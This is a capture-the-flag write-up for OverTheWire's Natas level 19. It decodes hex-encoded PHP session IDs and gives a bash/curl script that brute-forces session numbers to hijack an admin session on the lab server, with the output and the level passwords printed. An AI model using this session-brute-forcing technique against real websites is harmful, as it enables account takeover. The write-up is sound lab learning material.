# NATAS LEVEL 19

```
http://overthewire.org/wargames/natas/natas19.html
```

```
Username: natas19
Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
URL:      http://natas19.natas.labs.overthewire.org
```

<img src='index.jpg' width=500px>

### SOLUTION

There is no code for us to inspect this time through, only the hint that it
is "mostly the same" as the previous level except sessionIDs are no longer
sequential.

Hm.

#### COOKIE INSPECTION

Trial and error with username `admin` and password `foo`, we see the our
PHPSESSID cookie is set to `3232382d61646d696e`

<img src='cookie.jpg' width=500px>

Resending the same username/password combination gave us a different
PHPSESSID cookie of "38352d61646d696e", but the last 12 digits were the same
"2d61646d696e". Hm. Let's try generating a few more SESSION IDs with user admin
to see if we can derive a pattern..

```
3-23238-2d61646d696e
3-835-2d61646d696e
3-23938-2d61646d696e
3-13338-2d61646d696e
3-339-2d61646d696e
3-43930-2d61646d696e
3-33436-2d61646d696e
3-135-2d61646d696e
3-23838-2d61646d696e
3-533-2d61646d696e
3-63038-2d61646d696e
3-43231-2d61646d696e
3-33536-2d61646d696e
3-13033-2d61646d696e
3-13133-2d61646d696e
3-53438-2d61646d696e
```

So it seems that the SESSION ID always starts with 3 and has a random 3-5 digit
number before the fixed suffix.

Tried using a different username than `admin` results in a completely new
string for our PHPSESSID (well, except that it always seems to start with "3").
So, somehow our username seems to be incorporated into the SESSIONID and for
`admin` the last 12 digits of the sessionID should be `2d61646d696e`.

#### HEXADECIMAL

Tried feeding the SESSION ID into a hex-to-ascii conversion and finally got
the pattern of the SESSION ID:

```
3232382d61646d696e  228-admin	
38352d61646d696e    85-admin
3239382d61646d696e  298-admin
3133382d61646d696e  138-admin
33392d61646d696e    39-admin
3439302d61646d696e  490-admin
3334362d61646d696e  346-admin
31352d61646d696e    15-admin
3238382d61646d696e  228-admin
35332d61646d696e    53-admin
3630382d61646d696e  608-admin
3432312d61646d696e  421-admin
3335362d61646d696e  356-admin
3130332d61646d696e  103-admin
3131332d61646d696e  113-admin
3534382d61646d696e  548-admin
```

#### BRUTE FORCE

Well, let's cycle through all the sequences between `0-admin` and `640-admin`
(since we are assuming the same "max" range for session identifiers as in the
last level) for our SESSIONID variable and see what happens.

```
$ cat script.sh
#! /bin/bash

for SEQ in {0..640}
do
  # PHPSESSID is the hexadecimal representation of "randomnum-username"
  SESSIONSTR="${SEQ}-admin"
  SESSIONID="$(echo -n ${SESSIONSTR} | xxd -p)"
  echo "${SEQ}: ${SESSIONID}"

  curl --silent \
    'http://natas19.natas.labs.overthewire.org/index.php?debug' \
    -H 'Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==' \
    -H "Cookie: PHPSESSID=${SESSIONID}" \
    --data 'username=admin&password=foo' \
    | grep "regular" >/dev/null

  if [ $? -ne 0 ]; then
    # if the string "regular user" is not present, that probably means we
    # found the admin session?
    break;
  fi
done
```

```
$ ./script.sh
0: 302d61646d696e
1: 312d61646d696e
2: 322d61646d696e

<...>

278: 3237382d61646d696e
279: 3237392d61646d696e
280: 3238302d61646d696e
281: 3238312d61646d696e
```

We stopped at #281.  Let's validate..

```
$ echo 3238312d61646d696e | xxd -r -p
281-admin
$ curl --silent 'http://natas19.natas.labs.overthewire.org/index.php?debug' -H 'Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==' -H "Cookie: PHPSESSID=3238312d61646d696e" --data 'username=admin&password=foo'
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>
</body>
</html>
```
